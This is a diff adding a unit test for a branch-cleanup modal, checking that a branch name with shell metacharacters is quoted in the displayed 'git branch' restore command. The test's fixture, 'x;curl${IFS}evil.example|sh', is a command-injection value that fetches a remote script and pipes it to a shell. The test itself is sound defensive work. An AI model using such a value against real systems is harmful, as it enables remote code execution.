@@ -173,6 +173,18 @@ describe('CleanupModal', () => {
     expect(w.find('[data-delete]').exists()).toBe(false)
   })
 
+  it('quotes a branch name with shell metacharacters in the restore command', async () => {
+    const hostile = 'x;curl${IFS}evil.example|sh'
+    vi.mocked(runCleanup).mockResolvedValue([{ branch: hostile, sha: 'aaa1111111111111', deleted: true }])
+    const w = await open()
+    await w.get('[data-delete]').trigger('click')
+    await flushPromises()
+
+    const shown = w.get('pre.restore').text()
+    expect(shown).toBe(`git branch '${hostile}' aaa1111111111111`)
+    expect(shown).not.toContain(`git branch ${hostile}`) // never the raw name
+  })
+
   it('shows an error if the request fails and keeps the list', async () => {
     vi.mocked(runCleanup).mockRejectedValue(new Error('internal error'))
     const w = await open()
